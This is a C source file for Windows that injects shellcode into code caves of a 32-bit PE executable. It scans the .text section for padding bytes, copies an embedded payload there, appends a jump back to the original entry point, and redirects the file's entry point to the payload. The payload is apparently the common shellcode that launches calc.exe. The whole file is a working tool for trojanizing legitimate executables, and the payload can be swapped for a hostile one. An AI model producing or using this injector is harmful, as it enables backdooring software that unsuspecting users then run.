#include <stdio.h>
#include <Windows.h>

typedef struct _CAVE_INFO
{
	PBYTE pStartAddress;
	PBYTE pEndAddress;
	DWORD dwSize;
	DWORD offset;
	DWORD rva;
} CAVE_INFO, * PCAVE_INFO;

int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, CAVE_INFO *caveInfo)
{
	PBYTE pSectionStart = pBuffer + pSectionHeader->PointerToRawData;
	DWORD dwSectionSize = pSectionHeader->SizeOfRawData;
	printf("[+] Section start address: 0x%p\n", pSectionStart);

	PBYTE pStartAddress = NULL;
	PBYTE pEndAddress = NULL;

	DWORD caveSize = 0;
	PBYTE previousAddress = NULL;
	CAVE_INFO caveInfoArray[100] = {0};
	int caveIndex = 0;

	for (DWORD i = 0; i <= dwSectionSize; i++)
	{
		if (*(BYTE*)(pSectionStart + i) == 0xCC ||
			*(BYTE*)(pSectionStart + i) == 0x90 ||
			*(BYTE*)(pSectionStart + i) == 0x00)
		{
			previousAddress = pSectionStart + i;

			if (pStartAddress == NULL)
			{
				pStartAddress = pSectionStart + i;
			}
			else
			{
				caveSize++;
				pEndAddress = pSectionStart + i;
			}
		}
		else
		{
			if (caveSize >= 50 && caveIndex <= 99)
			{
				CAVE_INFO cave = {
					pStartAddress,
					pEndAddress,
					caveSize
				};
				printf("CAVE Start: %p\n", cave.pStartAddress);
				printf("CAVE End: %p\n", cave.pEndAddress);
				printf("CAVE Size: %d\n", cave.dwSize);
				caveInfoArray[caveIndex] = cave;
				caveIndex++;
			}

			pStartAddress = NULL;
			pEndAddress = NULL;
			caveSize = 0;
		}
		/*if ((i + 1) % 16 == 0)
		{
			printf("\n");
		}
		*/
	}

	printf("\033[0;32m[+] Found %d cave(s) in the section.\033[0m\n", caveIndex);
	for (int i = 0; i < caveIndex; i++)
	{
		printf("Cave [%d]:\n", i);
		DWORD caveSectionOffset = (DWORD)(caveInfoArray[i].pStartAddress - pSectionStart);
		DWORD rva = pSectionHeader->VirtualAddress + caveSectionOffset;
		DWORD caveFileOffset = pSectionHeader->PointerToRawData + caveSectionOffset;

		// TODO: Grab largest cave or give user option to select cave instead of just grabbing the last one.
		caveInfo->pStartAddress = caveInfoArray[i].pStartAddress;
		caveInfo->pEndAddress = caveInfoArray[i].pEndAddress;
		caveInfo->dwSize = caveInfoArray[i].dwSize;
		caveInfo->offset = caveFileOffset;
		caveInfo->rva = rva;
		printf("  Start Address: 0x%p\n", caveInfo->pStartAddress);
		printf("  End Address: 0x%p\n", caveInfo->pEndAddress);
		printf("  Size: %d bytes\n", caveInfo->dwSize);
		printf("  Offset: 0x%04X\n", caveInfo->offset);
		printf("  RVA: 0x%04X\n", caveInfo->rva);
	}

	return 0;
}

BOOL generatePayload(DWORD originalEntryPoint, PCAVE_INFO pCaveInfo, PBYTE pCaveAddress)
{
	unsigned char payload[] = {0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00,
		0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c,
		0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,
		0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,
		0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c,
		0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1, 0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3,
		0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31,
		0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03,
		0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01,
		0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04,
		0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a,
		0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a,
		0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f,
		0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd,
		0x9d, 0xff, 0xd5, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05,
		0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x53, 0xff, 0xd5, 0x63, 0x61,
		0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00};


	DWORD scSize = sizeof(payload);

	printf("[+] Size of shellcode (+5): %d\n", scSize + 5);
	printf("[+] Size of cave: %d\n", pCaveInfo->dwSize);
	if (scSize + 5 > pCaveInfo->dwSize)
	{
		printf("\033[0;31m[!] Cave is too small for payload!\033[0m\n");
		return FALSE;
	}

	printf("[+] Adding shellcode to code cave\n");
	memcpy((void*)pCaveAddress, payload, scSize);

	printf("Adding patch back to original entrypoint RVA\n");
	DWORD jmpRVA = pCaveInfo->rva + sizeof(payload);
	DWORD rel32 = (DWORD)(originalEntryPoint - (jmpRVA + 5));

	pCaveAddress[scSize] = 0xE9; // jmp
	*(DWORD*)(pCaveAddress + scSize + 1) = rel32;

	for (int i = 0; i < sizeof(payload); i++)
	{
		if (i == sizeof(payload) - 1)
		{
			printf("0x%02X\n", payload[i]);
		}
		else
		{
			printf("0x%02X, ", payload[i]);
		}
		if ((i + 1) % 12 == 0)
		{
			printf("\n");
		}
	}
	return TRUE;
}

int main(int argc, char *argv[])
{
	if (argc != 2)
	{
		printf("Usage: %s <input file>\n", argv[0]);
		return 1;
	}

	DWORD dwBinaryType = 100;
	GetBinaryTypeA(argv[1], &dwBinaryType);

	if (dwBinaryType != SCS_32BIT_BINARY)
	{
		printf("[*] Error: The file is not a 32-bit binary.\n");
		return 1;
	}

	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[*] Error opening file: %d\n", GetLastError());
		return 1;
	}

	HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
	if (hMap == NULL)
	{
		printf("[*] Error creating file mapping: %d\n", GetLastError());
		CloseHandle(hFile);
		return 1;
	}

	LPVOID pBuffer = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (pBuffer == NULL)
	{
		printf("[*] Error mapping view of file: %d\n", GetLastError());
		CloseHandle(hMap);
		CloseHandle(hFile);
		return 1;
	}

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pBuffer + pDosHeader->e_lfanew);
	DWORD originalEntryPoint = pNTHeaders->OptionalHeader.AddressOfEntryPoint;

	printf("[+] Buffer: 0x%p\n", (void*)pBuffer);
	printf("[+] EntryPoint RVA: 0x%04X\n", originalEntryPoint);

	PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(pNTHeaders);
	CAVE_INFO caveInfo = { 0 };

	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++)
	{
		printf("[+] Section %d: %s\n", i + 1, sectionHeaders[i].Name);
		printf("    Virtual Address: 0x%08X\n", sectionHeaders[i].VirtualAddress);
		printf("    Size of Raw Data: 0x%08X\n", sectionHeaders[i].SizeOfRawData);
		printf("    Pointer to Raw Data: 0x%08X\n", sectionHeaders[i].PointerToRawData);
		if (strcmp((char*)sectionHeaders[i].Name, ".text") == 0)
		{
			printf("    [*] Found %s section!\n", sectionHeaders[i].Name);
			printf("    [*] Virtual Address: 0x%08X\n", sectionHeaders[i].VirtualAddress);
			printf("    [*] Size of Raw Data: 0x%08X\n", sectionHeaders[i].SizeOfRawData);
			printf("    [*] Pointer to Raw Data: 0x%08X\n", sectionHeaders[i].PointerToRawData);
			enumerateSection(&sectionHeaders[i], (PBYTE)pBuffer, &caveInfo);
		}
	}

	PBYTE caveAddress = (PBYTE)pBuffer + caveInfo.offset;

	if (!generatePayload(originalEntryPoint, &caveInfo, caveAddress))
	{
		UnmapViewOfFile(pBuffer);
		CloseHandle(hMap);
		CloseHandle(hFile);
		return 1;
	}

	printf("[+] Updating entrypoint to code cave RVA\n");
	pNTHeaders->OptionalHeader.AddressOfEntryPoint = caveInfo.rva;

	printf("[+] New EntryPoint RVA: 0x%04X\n", pNTHeaders->OptionalHeader.AddressOfEntryPoint);


	printf("[+] Saving modifications\n");

	FlushViewOfFile(pBuffer, 0);
	UnmapViewOfFile(pBuffer);
	CloseHandle(hMap);
	CloseHandle(hFile);

	return 0;
}
